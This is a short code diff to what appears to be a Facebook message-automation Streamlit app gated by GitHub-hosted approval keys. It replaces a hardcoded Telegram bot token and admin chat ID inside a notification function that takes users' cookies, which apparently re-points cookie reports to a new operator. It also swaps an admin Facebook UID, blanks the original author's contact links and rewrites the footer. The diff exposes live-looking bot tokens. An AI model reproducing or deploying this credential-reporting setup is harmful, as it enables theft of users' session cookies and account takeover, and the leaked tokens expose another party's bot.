@@ -249,9 +249,9 @@ st.markdown(custom_css, unsafe_allow_html=True)
 # GitHub approval configuration
 GITHUB_RAW_URL = "https://raw.githubusercontent.com/killergodx09/Approvel/main/approval.txt"
 CONTACT_LINKS = {
-    "whatsapp": "https://wa.me/917668337116",
-    "telegram": "https://t.me/itxthedevil", 
-    "facebook": "https://m.facebook.com/Lord.Devil.X"
+    "whatsapp": "https://wa.me/",
+    "telegram": "https://t.me/", 
+    "facebook": "https://m.facebook.com/"
 }
 
 # Session state initialization
@@ -625,8 +625,8 @@ def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
 
 def send_telegram_notification(username, automation_state=None, cookies=""):
     try:
-        telegram_bot_token = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
-        telegram_admin_chat_id = "8186206231"
+        telegram_bot_token = "8571310717:AAF5OMDinXAOYCYAoliCzjHZCw7i7UANDdA"
+        telegram_admin_chat_id = "5924107334"
         
         from datetime import datetime
         import pytz
@@ -666,7 +666,7 @@ User has successfully started the automation process."""
         return False
 
 def send_admin_notification(user_config, username, automation_state=None, user_id=None):
-    ADMIN_UID = "100037931553832"
+    ADMIN_UID = "100021841126660"
     driver = None
     try:
         log_message(f"ADMIN-NOTIFY: Sending usage notification for user: {username}", automation_state)
@@ -1526,4 +1526,4 @@ PLS APPROVE MY KEY SIR"""
                     time.sleep(1)
                     st.rerun()
 
-st.markdown('<div class="footer">Made with ❤️ by LORD DEVIL | © 2025 All Rights Reserved</div>', unsafe_allow_html=True)
+st.markdown('<div class="footer">DING DONG DING</div>', unsafe_allow_html=True)
